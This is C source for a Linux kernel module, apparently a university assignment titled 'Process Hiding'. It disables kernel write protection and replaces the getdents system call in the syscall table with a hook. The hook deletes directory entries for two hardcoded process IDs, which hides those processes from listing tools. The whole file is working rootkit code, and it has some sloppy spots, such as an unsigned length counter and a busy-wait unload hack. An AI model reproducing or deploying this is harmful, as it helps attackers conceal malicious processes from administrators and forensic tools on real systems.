/*  
 *  mod.c - hook stdin
 */
#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif
#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
#include <linux/sched.h>
#include <asm/page.h>
#include <asm/pgtable.h>
#include <asm/unistd.h>
#include <asm/processor-flags.h>
#include <linux/types.h>
#include "sysmap.h"

#define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
#define DRIVER_DESC   "Assigment 3 Process Hiding"

static int myPIDArray[2] = {2442, 4840};
static int myPIDArrayLen = 2;
/* Structure directory entries */
struct linux_dirent {
               unsigned long  d_ino;     /* Inode number */
               unsigned long  d_off;     /* Offset to next linux_dirent */
               unsigned short d_reclen;  /* Length of this linux_dirent */
               char           d_name[];  /* Filename (null-terminated) */
           };
void ** syscall_table = (void * *) sys_call_table_R;
long (*orig_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
int r_count=0;

inline void disable_wp(void){
	write_cr0(read_cr0() & ~0x00010000);
}

inline void enable_wp(void){
	write_cr0(read_cr0() | 0x00010000);
}

/* convert char array to integer */
int atoi(char *str){
  int res = 0;
  int index = 0;
  int mul = 1;
  while(str[index]!='\0'){
    index ++;
  }
  index--;
  while(index>=0){
    if(str[index]<'0' || str[index]>'9'){
      return -1;
    }
    res += (str[index]-'0')*mul;
    mul *= 10;
    index --;
  }
  return res;
}

struct task_struct *get_task(pid_t pid) {
  struct task_struct *p = get_current(), *entry=NULL;
  list_for_each_entry(entry,&(p->tasks),tasks){
    if(entry->pid == pid){
      //printk("pid found=%d\n",entry->pid);
      return entry;
    }else{
     //printk(KERN_INFO "pid=%d not found: %d\n",pid, entry->pid);
    }
  }
  return NULL;
}

int find_hide_process(pid_t pid){
  int index = 0;
  struct task_struct *task = get_task(pid);
  if(task){
    while(index<myPIDArrayLen){
      if(myPIDArray[index] == pid){
        printk(KERN_INFO "I'd like to hid process pid=%d\n",pid);
        return 1;
        }
      index++;
    } 
    return 0;
  }else{
  return 0;
  }
}

static long my_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
  long retVal;
  unsigned long restLen;
  unsigned short currLen;

  int debug_count = 1000;

  r_count++;
  retVal = orig_sys_getdents(fd, dirent, count);
  printk(KERN_INFO "get dents value %ld\n",retVal);
  if(retVal > 0){
    restLen = retVal;
    while(restLen>0){
    //while(restLen>0 && debug_count>0){
      debug_count --;
      currLen = dirent->d_reclen;
      // avoid loop to death
      if(currLen<=0){
        break;
      }
      restLen -= currLen;
      if(find_hide_process(atoi(dirent->d_name))){
        memmove(dirent, (char *) dirent + dirent->d_reclen, restLen);
        retVal -= currLen;
      }
      //printk(KERN_INFO "pid=%s\n",dirent->d_name);
      if(restLen){
        /* Jump to next entry */
        dirent = (struct linux_dirent *) ((char *)dirent + dirent->d_reclen);
      }
    }
  }
  r_count--;
  return retVal;
}


static int __init mod_init(void)
{
  disable_wp(); 

  orig_sys_getdents = syscall_table[__NR_getdents];
  syscall_table[__NR_getdents] = my_sys_getdents;
 
  enable_wp();
  
  printk(KERN_INFO "Process Hiding Module loaded.\n");
  return 0;
}

static void __exit mod_exit(void)
{
  disable_wp();
  syscall_table[__NR_getdents] = orig_sys_getdents;
  enable_wp();
  while(r_count > 0){ //hack to unblock read
	printk(KERN_INFO "\n");
  }  
}



module_init(mod_init);
module_exit(mod_exit);

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");

